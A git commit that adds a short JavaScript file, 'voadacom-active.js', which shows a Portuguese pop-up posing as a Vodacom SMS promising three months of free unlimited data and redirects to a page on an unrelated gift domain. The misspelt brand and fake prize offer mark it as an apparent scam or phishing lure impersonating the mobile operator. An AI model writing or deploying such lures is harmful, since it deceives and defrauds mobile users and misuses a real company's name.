aa3a85de15c719dc43811081f7999fcefaebc3c4
ukebeblog <esther001imoh@gmail.com>
2025-02-07 09:09:41 +0100

    Create voadacom-active.js

---
+++ voadacom-active.js
@@ -0,0 +1,6 @@
+
+var password = 'ATIVAR DADOS'
+password=prompt('SMS: Parabéns, você está qualificado para dados gratuitos ilimitados de 3 meses da Vodacom. Por favor, pressione OK para ativar agora   ','ATIVAR DADOS');
+if (password != 'ATIVAR DADOS') {
+location.href='https://newyr-gift.org/vodacom-mz.html';
+}
